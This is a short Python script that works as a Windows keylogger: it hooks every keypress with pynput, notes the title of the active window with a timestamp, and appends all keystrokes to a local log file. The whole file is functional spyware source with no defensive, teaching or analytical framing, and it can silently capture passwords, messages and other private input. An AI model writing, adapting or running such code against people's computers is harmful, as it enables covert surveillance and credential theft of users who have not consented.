from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow
import datetime

LAST_WINDOW = None

# KEY
def pressed_key(key):
    global LAST_WINDOW
    #LOG
    with open("log.txt", "a") as file:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write("\n #### {} - {}\n".format(window, datetime.datetime.now()))
        try:
            if key.vk >= 96 and key.vk <= 105:
                key = key.vk - 96
        except:
            pass

        key = str(key).replace("'", "")
        print(key)

        if len(key) > 1:
            key = " [{}] ".format(key)

        file.write(key)

#KEYBOARD
with keyboard.Listener(on_press=pressed_key) as listener:
    listener.join()
